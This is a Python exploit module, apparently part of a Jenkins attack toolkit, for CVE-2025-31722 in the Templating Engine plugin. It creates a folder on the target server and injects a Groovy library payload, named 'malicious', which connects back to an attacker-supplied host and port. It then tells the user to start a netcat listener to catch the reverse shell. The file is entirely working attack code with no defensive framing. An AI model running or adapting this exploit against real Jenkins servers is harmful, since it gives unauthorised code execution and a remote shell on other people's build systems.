# exploits/cve_2025_31722.py
from rich.console import Console
import requests
import logging
import time

console = Console()
cve = "CVE-2025-31722"

def run(tool, lhost, lport, auth=None, headers=None, proxies=None, delay=0):
    """Exploit Templating Engine Plugin for RCE (CVE-2025-31722)."""
    logging.info("Attempting Templating Engine RCE (CVE-2025-31722)")
    if delay:
        time.sleep(delay)
    folder_name = "breaker-folder"
    payload = f"""@Library('malicious') import malicious; new malicious("{lhost}", {lport}).run()"""
    headers = headers or {}
    headers.update({"Content-Type": "application/x-www-form-urlencoded"})
    crumb_manager = tool.CrumbManager(tool.jenkins_url, auth=auth, headers=headers, proxies=proxies, delay=delay)
    headers = crumb_manager.inject(headers)

    create_folder_url = f"{tool.jenkins_url}/createItem?name={folder_name}&mode=com.cloudbees.hudson.plugins.folder.Folder"
    try:
        r = requests.post(create_folder_url, headers=headers, auth=auth, proxies=proxies, verify=False, timeout=5)
        if r.status_code not in [200, 201]:
            console.print(f"[red][!] Failed to create folder {folder_name}: {r.status_code}[/red]")
            return {"exploit": cve, "status": "failed", "details": f"Failed to create folder: {r.status_code}"}
    except Exception as e:
        console.print(f"[red][!] Error creating folder: {e}[/red]")
        return {"exploit": cve, "status": "failed", "details": str(e)}

    config_url = f"{tool.jenkins_url}/job/{folder_name}/configure"
    config_data = {
        "name": "malicious",
        "script": payload,
        "submit": "Save"
    }
    try:
        r = requests.post(config_url, headers=headers, data=config_data, auth=auth, proxies=proxies, verify=False, timeout=10)
        if r.status_code == 200:
            console.print(f"[green][+] Successfully injected malicious library in {folder_name} (CVE-2025-31722)[/green]")
            console.print(f"[yellow][!] Start listener: nc -nlvp {lport}[/yellow]")
            return {"exploit": cve, "status": "success", "details": "Injected malicious library"}
        else:
            console.print(f"[red][!] Failed to configure library: {r.status_code}[/red]")
            return {"exploit": cve, "status": "failed", "details": f"Failed to configure library: {r.status_code}"}
    except Exception as e:
        console.print(f"[red][!] Error exploiting Templating Engine Plugin: {e}[/red]")
        return {"exploit": cve, "status": "failed", "details": str(e)}
